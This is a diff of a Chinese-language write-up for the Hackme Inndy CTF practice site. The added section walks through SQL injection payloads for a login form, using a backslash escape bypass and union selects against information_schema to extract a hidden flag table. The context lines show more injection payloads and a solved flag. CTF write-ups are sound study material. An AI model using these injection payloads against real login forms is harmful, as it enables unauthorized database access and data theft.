@@ -1,4 +1,4 @@
-[Hackme CTF](htts://hackme.inndy.tw)
+[Hackme Inndy CTF](htts://hackme.inndy.tw)
 ===
 
 參賽者：Will
@@ -18,7 +18,7 @@
 
 **Payload 1:** 取得資料庫名 g8
 
-`https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,(database()),4#`
+`https://hackme.inndy.tw/gb/?mod=read&id=-1 union select 1,2,database(),4#`
 
 **Payload 2:** 得到資料庫表名 flag
 
@@ -62,7 +62,6 @@ $flag = "FLAG{Yoooooo_LFI_g00d_2cXxsXSYP9EVLrIo}";
 
 
 ### 0x04 homepage
-
 #### https://hackme.inndy.tw/
 
 查看原始碼得知 [cute.js](https://hackme.inndy.tw/cute.js)
@@ -76,7 +75,6 @@ aaencode 解碼後得到 js 原始碼
 
 
 ### 0x05 ping
-
 #### https://hackme.inndy.tw/ping/
 
 有一串黑名單陣列, 發現 `sort` 沒防護到
@@ -102,7 +100,6 @@ $blacklist = [
 
 
 ### 0x06 scoreboard
-
 #### https://hackme.inndy.tw/scoreboard/
 
 **Payload:** X-Flag 就是 flag
@@ -112,7 +109,6 @@ $blacklist = [
 
 
 ### 0x07 login as admin 0
-
 #### https://hackme.inndy.tw/login0/
 
 過濾可以知道 `'` 會被取代成 `\\'`, 因此 `\'` 可以濾過
@@ -143,3 +139,43 @@ password = 1
 username = \' || 1 limit 1,1#
 password = 1
 ```
+
+
+
+### 0x08 login as admin 0.1
+#### https://hackme.inndy.tw/login0/
+**Payload 1:** 2 會有反應
+
+``` 
+username = \' union select 1,2,3,4#
+password = 1
+```
+
+**Payload 2:** 得到資料庫為 `login_as_admin0`
+
+``` 
+username = \' union select 1,database(),3,4#
+password = 1
+```
+
+**Payload 3:** 得到資料庫表名 `h1dden_f14g`
+
+```
+username = \' union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1),3,4#
+password = 1
+```
+
+**Payload 4:** 得到資料庫列名 `the_f14g`
+
+```
+username = \' union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=0x68316464656e5f66313467 limit 0,1),3,4#
+password = 1
+```
+
+**Payload 4:** 得到 flag
+
+```
+username = \' union select 1,(select the_f14g from h1dden_f14g limit 0,1),3,4#
+password = 1
+```
+
